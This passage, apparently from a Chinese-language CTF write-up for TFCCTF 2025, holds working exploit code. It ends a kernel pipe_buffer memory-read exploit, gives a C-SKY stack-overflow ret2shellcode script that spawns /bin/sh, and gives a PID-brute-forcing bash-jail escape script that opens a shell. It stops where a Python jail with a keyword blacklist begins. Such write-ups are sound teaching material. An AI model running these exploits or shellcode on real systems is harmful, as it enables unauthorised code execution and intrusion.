hexdump((<span class="type">unsigned</span> <span class="type">char</span>*)out,<span class="number">0x50</span>);</span><br><span class="line">            hex(i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> kernel_base = out[<span class="number">2</span>] - <span class="number">0x6128c0</span>;</span><br><span class="line">    <span class="type">size_t</span> fsrc = (out[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    lss(<span class="string">&quot;kernel_base&quot;</span>, kernel_base);</span><br><span class="line">    <span class="comment">//pause();</span></span><br><span class="line"></span><br><span class="line">    <span class="type">size_t</span> flag_addr = (out[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFFF000000</span>);</span><br><span class="line">    out[<span class="number">0</span>] = flag_addr;</span><br><span class="line">    edit(<span class="number">-0x400</span>*tmp,<span class="number">1</span> + <span class="number">0x400</span>*tmp,(<span class="type">char</span>*)out);</span><br><span class="line">    <span class="comment">//read(pfd[i][1],(char*)ptr,0x100);</span></span><br><span class="line">    <span class="type">int</span> tmp_fd_idx = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0x81</span>;i&lt;<span class="number">0x100</span>;i+=<span class="number">2</span>)&#123;</span><br><span class="line">        tmp_fd_idx = i;</span><br><span class="line">        read(pfd[i][<span class="number">0</span>],(<span class="type">char</span>*)ptr,<span class="number">0x400</span>); <span class="comment">// 这里 是看看相邻的是不是 pipe_buffer  结构体，</span></span><br><span class="line">        <span class="keyword">if</span>(((<span class="type">size_t</span>*)ptr)[<span class="number">0</span>] != <span class="number">0x5959595959595959</span>)&#123;</span><br><span class="line">            hexdump((<span class="type">unsigned</span> <span class="type">char</span>*)ptr,<span class="number">0x10</span>);</span><br><span class="line">            lss(<span class="string">&quot;tmp_fd_idx&quot;</span>, tmp_fd_idx);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">size_t</span> j = <span class="number">1</span>;</span><br><span class="line">    <span class="type">size_t</span> base = (out[<span class="number">0</span>] &amp; <span class="number">0xFFFFFFFFFF000000</span>);</span><br><span class="line">    <span class="built_in">memset</span>((<span class="type">void</span>*)tmp_buf, <span class="number">0x42</span>, <span class="number">0xFFF</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pb</span> =</span> (<span class="keyword">struct</span> pipe_buffer *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read...&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="type">size_t</span> target_mask = j * <span class="number">0x1000</span>;</span><br><span class="line">        target_mask &gt;&gt;= <span class="number">0xC</span>;</span><br><span class="line">        target_mask &lt;&lt;= <span class="number">0x6</span>;</span><br><span class="line"></span><br><span class="line">        pb-&gt;page = base + target_mask;</span><br><span class="line">        pb-&gt;offset = <span class="number">0</span>;</span><br><span class="line">        pb-&gt;len = <span class="number">0x800</span>;</span><br><span class="line">        pb-&gt;ops = kernel_base + <span class="number">0x6128c0</span>; <span class="comment">//pipe_buf_ops</span></span><br><span class="line">        pb-&gt;flags = <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//out[0] = (fsrc &amp; 0xFFFFFFFFFF000000);// + target_mask;</span></span><br><span class="line">        edit(<span class="number">-0x400</span>*tmp,<span class="number">1</span> + <span class="number">0x400</span>*tmp,(<span class="type">char</span>*)pb);</span><br><span class="line">        <span class="comment">//puts(&quot;edit&quot;);</span></span><br><span class="line">        <span class="comment">//pause();</span></span><br><span class="line">        read(pfd[tmp_fd_idx][<span class="number">0</span>],(<span class="type">char</span>*)ptr,<span class="number">0x700</span>);</span><br><span class="line">        <span class="comment">//hexdump((unsigned char*)ptr,0x40);</span></span><br><span class="line">        <span class="comment">//pause();</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((ptr[<span class="number">0x560</span>/<span class="number">8</span>] &amp; <span class="number">0xFFFFFF</span>) == <span class="number">0x434654</span> || (ptr[<span class="number">0x560</span>/<span class="number">8</span>] &amp; <span class="number">0xFFFFFF</span>) == <span class="number">0x465443</span>) &#123;</span><br><span class="line">            <span class="built_in">puts</span>((<span class="type">char</span>*)&amp;ptr[<span class="number">0x560</span>/<span class="number">8</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        j++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">void</span> _start()&#123;</span><br><span class="line">    <span class="type">size_t</span> env[<span class="number">0</span>];</span><br><span class="line">    environ = (<span class="type">size_t</span>)&amp;env[<span class="number">4</span>];</span><br><span class="line">    doMain();</span><br><span class="line">    syscall64(<span class="number">60</span>,<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2><span id="mucusky">MUCUSKY</span><a href="#mucusky" class="header-anchor"></a></h2><p>下载一个ghida插件  </p>
<p><a href="https://github.com/leommxj/ghidra_csky">https://github.com/leommxj/ghidra_csky</a></p>
<p>栈溢出</p>
<p><img src="../images/2025-TFCCTF/4.png" alt="1"></p>
<p>后面就是 调试工具了可以从这里下载到</p>
<p><a href="https://gitee.com/swxu/csky-elfabiv2-tools">https://gitee.com/swxu/csky-elfabiv2-tools</a></p>
<p>后面经过测试发现 stack 地址 貌似是固定的</p>
<p>然后 ret2shellcode</p>
<p> 要注意的是 有些字符不能发送，不然会截断？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">![<span class="number">5</span>](../images/<span class="number">2025</span>-TFCCTF/<span class="number">5.</span>png)<span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from ctypes import CDLL</span></span><br><span class="line"><span class="comment">#cdl = CDLL(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line">s    = <span class="keyword">lambda</span>   x : io.send(x)</span><br><span class="line">sa   = <span class="keyword">lambda</span> x,y : io.sendafter(x,y)</span><br><span class="line">sl   = <span class="keyword">lambda</span>   x : io.sendline(x)</span><br><span class="line">sla  = <span class="keyword">lambda</span> x,y : io.sendlineafter(x,y)</span><br><span class="line">r    = <span class="keyword">lambda</span> x   : io.recv(x)</span><br><span class="line">ru   = <span class="keyword">lambda</span> x   : io.recvuntil(x)</span><br><span class="line">rl   = <span class="keyword">lambda</span>     : io.recvline()</span><br><span class="line">itr  = <span class="keyword">lambda</span>     : io.interactive()</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ls   = <span class="keyword">lambda</span> x   : log.success(x)</span><br><span class="line">lss  = <span class="keyword">lambda</span> x   : ls(<span class="string">&#x27;\033[1;31;40m%s -&gt; 0x%x \033[0m&#x27;</span> % (x, <span class="built_in">eval</span>(x)))</span><br><span class="line"></span><br><span class="line">attack = <span class="string">&#x27;1.1.11 123&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#cmd = &#x27;env -i ./qemu -g 1234 ./mucusuki&#x27;</span></span><br><span class="line">cmd = <span class="string">&#x27;env -i ./qemu ./mucusuki&#x27;</span></span><br><span class="line"><span class="comment">#io = process(cmd.split(&#x27; &#x27;))</span></span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&#x27;mucusuki-8b05dc5f3ea795f2.challs.tfcctf.com 1337&#x27;</span></span><br><span class="line">io = remote(*cmd.split(<span class="string">&#x27; &#x27;</span>),ssl=<span class="literal">True</span>)</span><br><span class="line"><span class="comment">#cmd = &#x27;127.0.0.1 1337&#x27;</span></span><br><span class="line"><span class="comment">#io = remote(*cmd.split(&#x27; &#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(ru(<span class="string">&#x27;:&#x27;</span>))</span><br><span class="line"></span><br><span class="line">sc  = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#sc += &#x27;0c ea 50 81  30 78 0c&#x27;</span></span><br><span class="line"><span class="comment">#sc  += &#x27;7b6c 2214   0032 0033 f230 0dea 1083 3478&#x27;</span></span><br><span class="line">sc  += <span class="string">&#x27;7b6c 2214   0032 0033 f230 0cea 1083 3078&#x27;</span></span><br><span class="line"><span class="comment">#sc  += &#x27; 7b6c 2015   0032 0033 f230 0dea 1083 3478&#x27;</span></span><br><span class="line">sc = <span class="built_in">bytes</span>.fromhex(sc.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>))</span><br><span class="line">pay  = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">pay  = sc</span><br><span class="line">pay  = pay.ljust(<span class="number">100</span>,<span class="string">b&#x27;A&#x27;</span>)</span><br><span class="line">pay += p32(<span class="number">0</span>)</span><br><span class="line"><span class="comment">#pay += p32(0x3ffff348)</span></span><br><span class="line"><span class="comment">#pay += p32(0x3ffffe88)</span></span><br><span class="line">pay += p32(<span class="number">0x3ffffecc</span>)</span><br><span class="line">pay += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line"><span class="comment">#pay += p32(0x00008162)</span></span><br><span class="line"><span class="comment">#pay += p32(0x000008150)</span></span><br><span class="line"><span class="comment">#pay += p32(0x42424242)</span></span><br><span class="line"><span class="comment">#pay += b&#x27;C&#x27; * 0x10</span></span><br><span class="line"><span class="comment">#pay += sc</span></span><br><span class="line">sl(pay)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>

<ul>
<li>构造shellcode，由于不太清楚这个架构的 系统调用号</li>
</ul>
<p>Elf 里面的 read 系统调用号是 0x54</p>
<p><img src="../images/2025-TFCCTF/5.png" alt="1"></p>
<p>而 linux 源码里面的是 64 <a href="https://github.com/c-sky/linux-4.9.y">https://github.com/c-sky/linux-4.9.y</a></p>
<p>&gt;&gt;&gt; 0x54-63</p>
<p>21</p>
<p>相差21</p>
<p><img src="../images/2025-TFCCTF/6.png" alt="1"></p>
<p>那么 正确的 execve调用号 可能也是 差 21</p>
<p>&gt;&gt;&gt; 221+21</p>
<p>242</p>
<p><img src="../images/2025-TFCCTF/7.png" alt="1"></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">    .section .text</span><br><span class="line">    .globl _start</span><br><span class="line">_start:</span><br><span class="line">    mov r1,r14 ;  /<span class="built_in">bin</span>/sh</span><br><span class="line">    subi sp, sp ,<span class="number">0x8</span></span><br><span class="line">    movi r2,<span class="number">0</span></span><br><span class="line">    movi r3,<span class="number">0</span></span><br><span class="line">    movi r0,<span class="number">0xf2</span> ;<span class="number">242</span> execve</span><br><span class="line">    movi r12,<span class="number">0x8310</span> ; syscall()</span><br><span class="line">    jmp r12</span><br></pre></td></tr></table></figure>

<p><img src="../images/2025-TFCCTF/8.png" alt="1"></p>
<p><img src="../images/2025-TFCCTF/9.png" alt="1"></p>
<h1><span id="misc">Misc</span><a href="#misc" class="header-anchor"></a></h1><h2><span id="minijail">MINIJAIL</span><a href="#minijail" class="header-anchor"></a></h2><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND=noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get update \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; apt-get install -y --no-install-recommends bash socat \</span></span><br><span class="line"><span class="language-bash"> &amp;&amp; <span class="built_in">rm</span> -rf /var/lib/apt/lists/*</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="language-bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> yo_mama .</span></span><br><span class="line"><span class="keyword">COPY</span><span class="language-bash"> flag.txt /tmp/flag.txt</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> random_file=$(<span class="built_in">mktemp</span> /flag.XXXXXX) &amp;&amp; <span class="built_in">mv</span> /tmp/flag.txt <span class="string">&quot;<span class="variable">$random_file</span>&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">chmod</span> +x yo_mama</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="language-bash"> [<span class="string">&quot;socat&quot;</span>, <span class="string">&quot;TCP-LISTEN:4444,reuseaddr,fork&quot;</span>, <span class="string">&quot;EXEC:./yo_mama yooooooo_mama_test,pty,stderr&quot;</span>]</span></span><br></pre></td></tr></table></figure>

<p>先看到Dockerfile里面有个奇怪的启动项，看<code>yo_mama</code>这个程序</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">goog=<span class="string">&#x27;^[$&gt;_=:!()&#123;&#125;]+$&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">true</span>; <span class="keyword">do</span></span><br><span class="line">    <span class="built_in">echo</span> -n <span class="string">&quot;caca$ &quot;</span></span><br><span class="line">    <span class="built_in">stty</span> -<span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">read</span> -r mine</span><br><span class="line">    <span class="built_in">stty</span> <span class="built_in">echo</span></span><br><span class="line">    <span class="built_in">echo</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> [[ <span class="variable">$mine</span> =~ <span class="variable">$goog</span> ]]; <span class="keyword">then</span></span><br><span class="line">        <span class="built_in">eval</span> <span class="string">&quot;<span class="variable">$mine</span>&quot;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> <span class="string">&#x27;[!] Error: forbidden characters detected&#x27;</span></span><br><span class="line">        <span class="built_in">printf</span> <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    <span class="keyword">fi</span></span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure>

<p>看到白名单，很有php无字母参数RCE那个味道，只要满足就<code>eval</code>执行，最重要的就是0和1，再切片就可以了</p>
<p>取 <code>$1</code> 和 <code>$_</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_=$((!_____))</span><br><span class="line">__=<span class="variable">$&#123;!_&#125;</span></span><br><span class="line">___=<span class="variable">$_</span></span><br></pre></td></tr></table></figure>

<p> <code>__</code> 应该是 <code>yooooooo_mama_test</code>，</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;___&#125;</span>$(<span class="variable">$_</span>)<span class="variable">$&#123;__&#125;</span></span><br></pre></td></tr></table></figure>

<p>现在开始<strong>每次左移一个字符</strong>，直到你看到打印出来的串<strong>以</strong> <strong><code>s</code></strong> <strong>开头</strong>为止（也就是变成 <code>s</code> 后面一堆字母）。左移一格的命令是：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__=<span class="variable">$&#123;__:$((!_____))&#125;</span></span><br></pre></td></tr></table></figure>

<p>左移一次就再执行一次上面的“打印”命令：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$&#123;___&#125;</span>$(<span class="variable">$_</span>)<span class="variable">$&#123;__&#125;</span></span><br></pre></td></tr></table></figure>

<ul>
<li>重复“左移 → 打印 → 左移 → 打印”，直到打印出来的第一字符是 <code>s</code>（大概要按很多次，不用数，看到开头是 <code>s</code> 就行）。把这个<strong>首字符</strong>（也就是 <code>s</code>）单独取出来存到变量里：</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">____=<span class="variable">$&#123;__:$((________)):$((!_____))&#125;</span></span><br></pre></td></tr></table></figure>

<p>处理 <code>___</code>（它现在是 <code>echo</code>），左移两次得到以 <code>h</code> 开头：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">___=<span class="variable">$&#123;___:$((!_____))&#125;</span></span><br><span class="line">___=<span class="variable">$&#123;___:$((!_____))&#125;</span></span><br></pre></td></tr></table></figure>

<p>现在是<code>ho</code>，取出这个 <code>h</code>：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_____=<span class="variable">$&#123;___:$((________)):$((!_____))&#125;</span></span><br><span class="line">______=<span class="variable">$&#123;____&#125;</span><span class="variable">$&#123;_____&#125;</span></span><br><span class="line"><span class="variable">$______</span></span><br></pre></td></tr></table></figure>

<p>其实<code>$_____</code>就已经是h，但是为了后面不重复键，所以移动到了<code>$______</code>，再构造<code>s</code>，最初的<code>yooooooo_mama_test</code>也就是<code>$1</code>的第十六位为<code>s</code>，通过爆破偏移PID来获得16从而构造出s，但是这样子PID是有局限性的，所以写脚本要限制一下，最终exp如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">targets = [<span class="number">16</span>&lt;&lt;i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"></span><br><span class="line">hsteps = [</span><br><span class="line">    <span class="string">&quot;_=$((!_____))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__=$&#123;!_&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;___=$_&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&#123;___&#125;$($_)$&#123;__&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__=$&#123;__:$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&#123;___&#125;$($_)$&#123;__&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;____=$&#123;__:$((________)):$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;___=$&#123;___:$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;___=$&#123;___:$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;_____=$&#123;___:$((________)):$((!_____))&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;______=$&#123;____&#125;$&#123;_____&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$______&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ssteps1 = [</span><br><span class="line">    <span class="string">&quot;__=$(())&quot;</span>,</span><br><span class="line">    <span class="string">&quot;__=$((!$__))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;____=$(($$))&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">ssteps2 = [</span><br><span class="line">    <span class="string">&quot;_____=$&#123;!__:____:__&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$_____&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$_____$______&quot;</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment">#p = remote(&quot;127.0.0.1&quot;, 4444)</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    ncat --ssl minijail-1845e80796387fe2.challs.tfcctf.com 1337</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    p = remote(<span class="string">&quot;minijail-1845e80796387fe2.challs.tfcctf.com&quot;</span>, <span class="number">1337</span>, ssl=<span class="literal">True</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&quot;$(($$))&quot;</span>)</span><br><span class="line">    n = p.recvuntil(<span class="string">b&quot;command not found&quot;</span>)</span><br><span class="line">    n = n.decode().split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">2</span>].strip()</span><br><span class="line">    n = <span class="built_in">int</span>(n)</span><br><span class="line">    <span class="keyword">if</span> n &gt; <span class="built_in">max</span>(targets):</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">elif</span> n <span class="keyword">in</span> targets:</span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> hsteps:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">            p.sendline(step.encode())</span><br><span class="line"></span><br><span class="line">        x = targets.index(n)</span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> ssteps1:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">            p.sendline(step.encode())</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(x):</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">            p.sendline(<span class="string">b&quot;____=$(($____&gt;&gt;$__))&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> step <span class="keyword">in</span> ssteps2:</span><br><span class="line">            p.recvuntil(<span class="string">b&quot;caca$&quot;</span>)</span><br><span class="line">            p.sendline(step.encode())</span><br><span class="line"></span><br><span class="line">        p.interactive()</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;Number: <span class="subst">&#123;n&#125;</span>&quot;</span>)</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>

<h2><span id="pjail">ΠJAIL</span><a href="#pjail" class="header-anchor"></a></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> concurrent <span class="keyword">import</span> interpreters</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> ctypes, pwd</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">os.setgroups([])</span><br><span class="line">os.setgid(pwd.getpwnam(<span class="string">&quot;nobody&quot;</span>).pw_gid)</span><br><span class="line"></span><br><span class="line">INPUT = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_eval</span>(<span class="params">user_input</span>):</span><br><span class="line">    safe_builtins = &#123;&#125;</span><br><span class="line"></span><br><span class="line">    blacklist = [<span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;code&#x27;</span>, <span class="string">&#x27;chr&#x27;</span>, <span class="string">&#x27;str&#x27;</span>, <span class="string">&#x27;bytes&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(b <span class="keyword">in</span> user_input <span class="keyword">for</span> b <span class="keyword">in</span> blacklist):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Blacklisted function detected.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">any</span>(<span class="built_in">ord</span>(c) &lt; <span class="number">32</span> <span class="keyword">or</span> <span class="built_in">ord</span>(c) &gt; <span class="number">126</span> <span class="keyword">for</span> c <span class="keyword">in</span> user_input):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Invalid characters detected.&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    success = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Result:&quot;</span>, <span 